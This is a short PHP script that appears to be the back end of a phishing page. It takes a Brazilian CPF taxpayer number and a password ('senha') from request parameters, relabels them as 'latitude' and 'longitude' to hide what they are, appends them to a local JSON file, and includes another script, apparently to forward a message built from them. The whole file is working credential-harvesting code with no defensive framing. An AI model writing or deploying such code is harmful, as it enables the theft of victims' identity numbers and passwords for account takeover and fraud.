<?php header("Access-Control-Allow-Origin: *");header("Access-Control-Allow-Methods: POST, GET");header('Content-Type: application/json');$data=array('latitude'=>$_GET['cpf'],'longitude'=>$_GET['senha']);$json_data=json_encode($data);$filename='bkp_json.json';file_put_contents($filename,$json_data,FILE_APPEND);$msg='latitude'.' '.$data['latitude'].' '.'longitude'.' '.$data['longitude'];include "./a.php"; ?>
